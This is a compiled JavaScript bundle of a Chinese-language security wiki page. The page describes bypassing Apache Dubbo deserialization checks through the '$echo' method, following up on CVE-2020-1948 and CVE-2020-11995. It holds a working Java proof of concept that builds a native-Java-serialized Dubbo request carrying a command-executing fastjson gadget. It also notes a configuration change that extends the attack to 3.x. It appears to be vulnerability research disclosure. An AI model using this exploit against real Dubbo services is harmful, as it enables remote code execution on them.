"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[7664],{30456:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>a,metadata:()=>r,toc:()=>d});var o=t(85893),s=t(11151);const a={},i="Dubbo Bypass deserialization checks",r={id:"components/Dubbo/Dubbo_deserialization",title:"Dubbo Bypass deserialization checks",description:"0x01 \u7b2c\u4e00\u6b21\u5c1d\u8bd5",source:"@site/docs/03-components/Dubbo/Dubbo_deserialization.md",sourceDirName:"03-components/Dubbo",slug:"/components/Dubbo/Dubbo_deserialization",permalink:"/docs/components/Dubbo/Dubbo_deserialization",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/03-components/Dubbo/Dubbo_deserialization.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"CVE-2021-36163 \u7eed",permalink:"/docs/components/Dubbo/CVE-2021-36163Cont"},next:{title:"RT Attack",permalink:"/docs/readTeam/"}},c={},d=[{value:"0x01 \u7b2c\u4e00\u6b21\u5c1d\u8bd5",id:"0x01-\u7b2c\u4e00\u6b21\u5c1d\u8bd5",level:2},{value:"0x02 \u5206\u6790",id:"0x02-\u5206\u6790",level:2},{value:"0x03 pwned &lt;=2.7.23",id:"0x03-pwned-2723",level:2},{value:"0x04 \u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u5b9e\u73b0 3.x \u7248\u672c\u7684\u5229\u7528",id:"0x04-\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u5b9e\u73b0-3x-\u7248\u672c\u7684\u5229\u7528",level:2}];function b(e){const n={code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h1,{id:"dubbo-bypass-deserialization-checks",children:"Dubbo Bypass deserialization checks"}),"\n",(0,o.jsx)(n.h2,{id:"0x01-\u7b2c\u4e00\u6b21\u5c1d\u8bd5",children:"0x01 \u7b2c\u4e00\u6b21\u5c1d\u8bd5"}),"\n",(0,o.jsxs)(n.p,{children:["\u5728\u590d\u73b0 Dubbo \u5386\u53f2\u6f0f\u6d1e\u65f6\uff0c\u53d1\u73b0 CVE-2020-11995 \u5373\u5bf9 CVE-2020-1948 \u7684\u4fee\u590d\u4e0d\u5b8c\u5168\uff0c",(0,o.jsx)(n.code,{children:"$echo"})," \u4ecd\u7136\u5b58\u5728\u5229\u7528\u65b9\u5f0f\uff0c\u540e\u7eed\u7248\u672c\u56e0\u4e3a\u5f15\u5165\u4e86 Hessian \u9ed1\u540d\u5355\u5c06\u8be5\u95ee\u9898\u5f88\u597d\u7684\u9690\u85cf\u4e86\uff0c\u4f46\u662f\u4ecd\u5b58\u5728\u539f\u751f\u53cd\u5e8f\u5217\u5316\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u5e76\u4e14\u5f71\u54cd\u7248\u672c  <=2.7.23\uff0c\u5982\u679c\u4fee\u6539\u914d\u7f6e\u540e\u4f1a\u5f71\u54cd\u5230\u6240\u6709\u7248\u672c\uff0c\u4e0a\u62a5\u7ed9 Dubbo \u540e\u5e76\u4e0d\u63a5\u53d7\u8ba4\u4e3a\u8fd9\u662f\u5e94\u8be5\u4ea4\u7531\u7528\u6237\u7ba1\u7406\u7684\u5b89\u5168\u95ee\u9898\uff0c\u6240\u4ee5\u5c06\u8be5\u5229\u7528\u516c\u5f00\u3002"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"dubbo",src:t(50676).Z+"",width:"2930",height:"1964"})}),"\n",(0,o.jsx)(n.h2,{id:"0x02-\u5206\u6790",children:"0x02 \u5206\u6790"}),"\n",(0,o.jsxs)(n.p,{children:["\u5728 2.7.8 \u8fd9\u4e2a\u7248\u672c\u4e2d\uff0c\u901a\u8fc7\u4fee\u6539 ",(0,o.jsx)(n.code,{children:"org.apache.dubbo.rpc.support.RpcUtils#isEcho()"})," \u8fd9\u4e2a\u65b9\u6cd5\u5bf9 CVE-2020-1948 \u8fdb\u884c\u4e86\u4fee\u590d\uff0c\u4f46\u662f\u8be5\u5224\u65ad\u5e76\u4e0d\u4e25\u683c"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20240206112813014",src:t(94353).Z+"",width:"2078",height:"468"})}),"\n",(0,o.jsxs)(n.p,{children:["\u4ecd\u7136\u53ef\u4ee5\u63a5\u53d7\u6765\u81ea\u7528\u6237\u7684 Object \u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u6784\u5efa\u5982\u4e0b payload \u5b9e\u73b0\u5229\u7528\u3002\u4e0d\u8fc7\u5728 Dubbo 2.7.14 \u7248\u672c\u4e2d\u4fee\u6539\u4e86 ",(0,o.jsx)(n.code,{children:"com.alibaba.com.caucho.hessian.io.ClassFactory"})," \u8fd9\u4e2a\u7c7b\uff0c\u5728 ",(0,o.jsx)(n.code,{children:"readObject()"})," \u65f6\u901a\u8fc7\u9ed1\u540d\u5355\u7684\u65b9\u5f0f\u9650\u5236\u4e86 Hessian \u53cd\u5e8f\u5217\u5316\uff0c\u4ee5\u81f3\u4e8e\u8be5\u95ee\u9898\u88ab\u4f3c\u4e4e\u5408\u7406\u7684\u9690\u85cf\u6389\u4e86\u3002"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:'oos.writeUTF("0.0.0");\noos.writeUTF("org.example.api.DemoService");\noos.writeUTF("0.0.0");\noos.writeUTF("$echo");\noos.writeUTF("Ljava/lang/Object;");\noos.writeObject(payload);\noos.writeObject(new HashMap());\noos.flushBuffer();\n'})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20240206112408859",src:t(72257).Z+"",width:"2386",height:"1098"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20240206112344405",src:t(77274).Z+"",width:"2480",height:"1288"})}),"\n",(0,o.jsx)(n.h2,{id:"0x03-pwned-2723",children:"0x03 pwned <=2.7.23"}),"\n",(0,o.jsxs)(n.p,{children:["\u800c\u66f4\u8fdb\u4e00\u6b65\u4e5f\u4e0d\u662f\u4ec0\u4e48\u79d8\u5bc6\uff0c\u65e2\u7136\u662f Hessian \u7684\u9ed1\u540d\u5355\uff0c\u4fee\u6539 ",(0,o.jsx)(n.code,{children:"header[2]"})," \u6307\u5b9a\u4e3a Java \u53cd\u5e8f\u5217\u5316\u7684\u65b9\u5f0f\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\uff0c\u5728 2.x \u7248\u672c\u4e2d\u5bf9\u4e8e\u8fd9\u79cd\u65b9\u5f0f\u5e76\u6ca1\u6709\u5b89\u5168\u9a8c\u8bc1\u3002"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-java",children:'public static void main(String[] args) throws Exception {\n    Object o = GadgetBuilder.fastjson("open -a Calculator.app");\n\n    // header.\n    byte[] header = new byte[16];\n\n    // set magic number.\n    Bytes.short2bytes((short) 0xdabb, header);\n\n    // set request and serialization flag.\n    // 2 -> "hessian2"\n    // 3 -> "java"\n    // 4 -> "compactedjava"\n    // 6 -> "fastjson"\n    // 7 -> "nativejava"\n    // 8 -> "kryo"\n    // 9 -> "fst"\n    // 10 -> "native-hessian"\n    // 11 -> "avro"\n    // 12 -> "protostuff"\n    // 16 -> "gson"\n    // 21 -> "protobuf-json"\n    // 22 -> "protobuf"\n    // 25 -> "kryo2"\n    header[2] = (byte) (0x80 | 3 | 0x40);\n\n    // set request id.\n    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);\n\n    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n    ObjectOutputStream oos = new ObjectOutputStream(baos);\n    /* For Requests, we need to encode the following objects\n          1.dubboVersion\n          2.path\n          3.version\n          4.methodName\n          5.methodDesc\n          6.paramsObject\n          7.map\n        */\n    oos.writeInt(666);\n    oos.writeUTF("0.0.0");\n    oos.writeInt(666);\n    oos.writeUTF("org.example.api.DemoService");\n    oos.writeInt(666);\n    oos.writeUTF("0.0.0");\n    oos.writeInt(666);\n    oos.writeUTF("$echo");\n    oos.writeInt(666);\n    oos.writeUTF("Ljava/lang/Object;");\n    oos.writeByte(666);\n    oos.writeObject(o);\n    oos.close();\n\n    Bytes.int2bytes(baos.size(), header, 12);\n\n    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n    byteArrayOutputStream.write(header);\n    byteArrayOutputStream.write(baos.toByteArray());\n    byte[] bytes = byteArrayOutputStream.toByteArray();\n    \n    Socket socket = new Socket("127.0.0.1", 12345);\n    OutputStream outputStream = socket.getOutputStream();\n    outputStream.write(bytes);\n    outputStream.flush();\n    outputStream.close();\n}\n'})}),"\n",(0,o.jsxs)(n.p,{children:["\u8fd9\u4e2a\u95ee\u9898\u5728 3.x \u4ee5\u4e0a\u7248\u672c\u88ab\u4fee\u590d\uff0c\u9ed8\u8ba4\u5f00\u542f\u4e86 ",(0,o.jsx)(n.code,{children:"SERIALIZATION_SECURITY_CHECK_KEY"})," \u68c0\u67e5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u6709\u4e00\u4e2a\u88ab\u5ffd\u7565\u7684\u4f5c\u7528 ",(0,o.jsx)(n.code,{children:"org.apache.dubbo.remoting.transport.CodecSupport#checkSerialization()"})," \u4f1a\u68c0\u6d4b\u5e8f\u5217\u5316 id\uff0c\u56e0\u4e3a\u6211\u4eec\u6784\u9020\u7684\u662f java \u4e0e\u9ed8\u8ba4\u7684 hessian \u4e0d\u5339\u914d\u6240\u4ee5\u6ca1\u6cd5\u5229\u7528\u3002"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20240225105722921",src:t(84806).Z+"",width:"2030",height:"224"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20240225085038020",src:t(920).Z+"",width:"2318",height:"814"})}),"\n",(0,o.jsx)(n.h2,{id:"0x04-\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u5b9e\u73b0-3x-\u7248\u672c\u7684\u5229\u7528",children:"0x04 \u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u5b9e\u73b0 3.x \u7248\u672c\u7684\u5229\u7528"}),"\n",(0,o.jsxs)(n.p,{children:["\u6211\u4eec\u7ee7\u7eed\u770b\u4e00\u4e0b ",(0,o.jsx)(n.code,{children:"org.apache.dubbo.common.URL#getParameter()"})," \u8fd9\u4e2a\u65b9\u6cd5\u505a\u4e86\u4ec0\u4e48\uff0c\u9996\u5148\u901a\u8fc7 ",(0,o.jsx)(n.code,{children:"org.apache.dubbo.common.url.component.param.DynamicParamTable#getKeyIndex()"})," \u83b7\u53d6 ",(0,o.jsx)(n.code,{children:"keyIndex"})," \u5f53\u83b7\u53d6\u4e3a null \u65f6\u4f1a\u76f4\u63a5\u4ece ",(0,o.jsx)(n.code,{children:"EXTRA_PARAMS"})," \u4e2d\u83b7\u53d6\u3002 ",(0,o.jsx)(n.code,{children:"EXTRA_PARAMS"})," \u6211\u4eec\u662f\u77e5\u9053\u7684\uff0c\u5728 spring \u9879\u76ee\u4e2d\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u8bbe\u7f6e ",(0,o.jsx)(n.code,{children:"dubbo.provider.serialization=java"}),"\uff0c\u6240\u4ee5\u5b9e\u73b0\u5728 3.x \u7248\u672c\u4e2d\u7684\u5229\u7528\u3002"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20240225105423195",src:t(83962).Z+"",width:"1508",height:"560"})}),"\n",(0,o.jsx)(n.p,{children:"\u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u7684\u5229\u7528\u5e76\u4e0d\u88ab Dubbo \u8ba4\u53ef\uff0cDubbo \u5b98\u65b9\u8ba4\u4e3a\u7528\u6237\u4e3b\u52a8\u542f\u7528 java \u53cd\u5e8f\u5217\u5316\u8fd9\u79cd\u65b9\u5f0f\u540e\uff0c\u5b89\u5168\u95ee\u9898\u5e94\u8be5\u4ea4\u7531\u7528\u6237\u6765\u5904\u7406"})]})}function p(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(b,{...e})}):b(e)}},50676:(e,n,t)=>{t.d(n,{Z:()=>o});const o=t.p+"assets/images/dubbo-7c801afbd8e464aea11dc5c4db12cf15.gif"},77274:(e,n,t)=>{t.d(n,{Z:()=>o});const o=t.p+"assets/images/image-20240206112344405-06babef7bd4926c5549e2b5fd94bf1cb.png"},72257:(e,n,t)=>{t.d(n,{Z:()=>o});const o=t.p+"assets/images/image-20240206112408859-646715aecf5358dea82d04bb40555430.png"},94353:(e,n,t)=>{t.d(n,{Z:()=>o});const o=t.p+"assets/images/image-20240206112813014-952a765eb191e625a31bce881cae23e5.png"},920:(e,n,t)=>{t.d(n,{Z:()=>o});const o=t.p+"assets/images/image-20240225085038020-569df8ebeb77e622d50face4d44dfa45.png"},83962:(e,n,t)=>{t.d(n,{Z:()=>o});const o=t.p+"assets/images/image-20240225105423195-7be6be5808fd5e4473279c2f74bec21f.png"},84806:(e,n,t)=>{t.d(n,{Z:()=>o});const o=t.p+"assets/images/image-20240225105722921-74c428c7c1519319869857337c2d348f.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>r,a:()=>i});var o=t(67294);const s={},a=o.createContext(s);function i(e){const n=o.useContext(a);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),o.createElement(a.Provider,{value:n},e.children)}}}]);